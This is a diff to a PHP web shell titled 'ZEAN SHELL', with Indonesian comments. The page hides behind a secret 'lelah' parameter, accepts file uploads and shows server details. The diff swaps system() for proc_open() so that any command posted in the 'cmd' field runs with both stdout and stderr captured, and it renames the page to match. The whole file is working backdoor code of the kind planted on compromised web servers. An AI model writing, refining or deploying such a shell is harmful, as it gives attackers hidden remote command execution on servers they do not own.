@@ -1,7 +1,7 @@
 <?php
 // Cek parameter "lelah"
 if (!isset($_GET['lelah']) && !isset($_POST['lelah'])) {
-    header("Location: /"); 
+    header("Location: /");
     exit;
 }
 
@@ -47,8 +47,6 @@ if (isset($_FILES['upload'])) {
         $upload_error_msg = "Error upload file: " . $_FILES['upload']['error'];
     }
     if ($upload_error_msg !== '') {
-        // Jangan redirect langsung jika ada error supaya bisa ditampilkan
-        // tapi supaya sederhana, kita tetap redirect dan bisa cek error via GET param juga.
         header("Location: " . build_url(['path' => $path, 'upload_error' => urlencode($upload_error_msg)]));
         exit;
     } else {
@@ -59,10 +57,34 @@ if (isset($_FILES['upload'])) {
 
 $output = '';
 if (isset($_POST['cmd'])) {
+    $cmd = $_POST['cmd'];
     chdir($path);
-    ob_start();
-    system($_POST['cmd']);
-    $output = ob_get_clean();
+
+    $descriptors = [
+      0 => ['pipe', 'r'], // stdin
+      1 => ['pipe', 'w'], // stdout
+      2 => ['pipe', 'w'], // stderr
+    ];
+
+    $process = proc_open($cmd, $descriptors, $pipes);
+
+    if (is_resource($process)) {
+        fclose($pipes[0]);
+
+        $output = stream_get_contents($pipes[1]);
+        fclose($pipes[1]);
+
+        $error = stream_get_contents($pipes[2]);
+        fclose($pipes[2]);
+
+        proc_close($process);
+
+        if ($error) {
+            $output .= "\nError:\n" . $error;
+        }
+    } else {
+        $output = "Failed to execute command.";
+    }
 }
 
 $server_ip = gethostbyname(gethostname());
@@ -75,7 +97,7 @@ $uname = php_uname();
 <html lang="en">
 <head>
 <meta charset="UTF-8" />
-<title>🌐 ZEAN SHELL (Upload Fix)</title>
+<title>🌐 ZEAN SHELL (proc_open)</title>
 <style>
     body { background: #1e1e2f; color: #cfd2dc; font-family: monospace; margin:0; padding: 20px; }
     a { color: #61dafb; text-decoration: none; }
@@ -91,7 +113,7 @@ $uname = php_uname();
 </style>
 </head>
 <body>
-<h1>🌐 ZEAN SHELL (Upload Fix)</h1>
+<h1>🌐 ZEAN SHELL (proc_open)</h1>
 
 <div>
     <b>Server Info:</b> <?= htmlspecialchars($server_ip) ?> |
@@ -185,3 +207,4 @@ foreach ($all as $file) {
 
 </body>
 </html>
+
